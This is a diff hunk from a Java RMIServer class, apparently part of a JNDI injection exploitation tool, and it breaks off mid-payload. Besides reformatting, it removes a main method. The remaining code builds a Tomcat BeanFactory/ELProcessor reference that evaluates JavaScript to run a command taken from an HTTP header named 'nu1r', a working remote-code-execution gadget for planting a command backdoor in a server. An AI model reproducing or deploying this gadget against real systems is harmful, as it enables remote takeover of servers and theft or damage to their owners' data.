@@ -290,20 +290,15 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         return true;
     }
 
-    public static void main(String[] args) throws Exception {
-        ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
-        Reflections.setFieldValue(rw, "wrappee", execByEL());
-    }
-
     @Autowired
     public static ResourceRef execByEL() {
 
-        RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
-        HttpServletRequest  httprequest  = ((ServletRequestAttributes) requestAttributes).getRequest();
-        HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();
+        RequestAttributes   requestAttributes = RequestContextHolder.getRequestAttributes();
+        HttpServletRequest  httprequest       = ((ServletRequestAttributes) requestAttributes).getRequest();
+        HttpServletResponse httpresponse      = ((ServletRequestAttributes) requestAttributes).getResponse();
 
-        String cmd = httprequest.getHeader("nu1r");
-        ResourceRef                   ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+        String      cmd = httprequest.getHeader("nu1r");
+        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
         ref.add(new StringRefAddr("x", String.format(
                 "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
